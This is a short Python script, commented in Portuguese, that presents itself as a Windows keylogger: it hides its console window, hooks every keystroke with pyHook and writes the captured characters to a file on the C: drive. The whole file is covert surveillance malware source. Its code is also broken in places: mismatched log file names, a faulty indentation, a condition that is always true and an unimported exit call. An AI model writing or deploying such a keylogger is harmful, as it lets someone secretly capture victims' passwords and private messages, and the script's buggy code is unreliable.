#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
# Keylogger para windows 

import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook 
  
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 
  
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8: 
    # abre o arquivo log.txt para ler as entradas 
        f = open('c:\log.txt', 'r+') 
        buffer = f.read() 
        f.close() 
    # abre o arquivo log.txt para escrever as entradas 
        f = open('c:\output.txt', 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
        keylogs = '/n'
        buffer += keylogs 
        f.write(buffer) 
        f.close() 
# cria a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# setar o hook 
hm.HookKeyboard() 
# ficar na espera
pythoncom.PumpMessages() 